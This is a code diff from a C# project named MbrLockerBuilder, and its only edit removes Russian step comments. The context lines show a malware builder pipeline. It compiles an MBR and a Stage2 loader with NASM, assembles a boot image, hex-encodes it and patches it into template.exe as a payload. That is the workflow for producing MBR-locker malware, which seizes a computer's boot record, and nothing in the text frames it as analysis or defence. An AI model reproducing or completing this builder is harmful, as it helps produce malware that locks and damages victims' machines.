@@ -313,7 +313,6 @@ namespace MbrLockerBuilder
                         throw new Exception("NASM не найден!");
                 }
 
-                // --- ШАГ 1: Компиляция MBR ---
                 this.lblStatus.Text = "2/8 Компиляция MBR...";
                 Application.DoEvents();
 
@@ -327,7 +326,6 @@ namespace MbrLockerBuilder
                 if (mbrBytes.Length != 512)
                     throw new Exception($"MBR size: {mbrBytes.Length} != 512");
 
-                // --- ШАГ 2: Компиляция Stage2 ---
                 this.lblStatus.Text = "3/8 Компиляция Stage2...";
                 Application.DoEvents();
 
@@ -339,7 +337,6 @@ namespace MbrLockerBuilder
                 RunNasm(nasmPath, stage2Path, stage2BinPath);
                 byte[] stage2Bytes = File.ReadAllBytes(stage2BinPath);
 
-                // --- ШАГ 3: Сборка полного образа ---
                 this.lblStatus.Text = "4/8 Сборка образа...";
                 Application.DoEvents();
 
@@ -348,13 +345,11 @@ namespace MbrLockerBuilder
                 Array.Copy(mbrBytes, 0, fullImage, 0, 512);
                 Array.Copy(stage2Bytes, 0, fullImage, 512 * 3, stage2Bytes.Length);
 
-                // --- ШАГ 4: Конвертация в HEX ---
                 this.lblStatus.Text = "5/8 Конвертация в HEX...";
                 Application.DoEvents();
 
                 string hex = BitConverter.ToString(fullImage).Replace("-", "");
 
-                // --- ШАГ 5: Поиск template.exe ---
                 this.lblStatus.Text = "6/8 Поиск template.exe...";
                 Application.DoEvents();
 
@@ -368,13 +363,11 @@ namespace MbrLockerBuilder
                         throw new Exception("template.exe не найден!");
                 }
 
-                // --- ШАГ 6: Патчинг ---
                 this.lblStatus.Text = "7/8 Патчинг шаблона...";
                 Application.DoEvents();
 
                 byte[] payloadBytes = this.PatchTemplate(templateBytes, hex);
 
-                // --- ШАГ 7: Сохранение ---
                 this.lblStatus.Text = "8/8 Сохранение...";
                 Application.DoEvents();
 
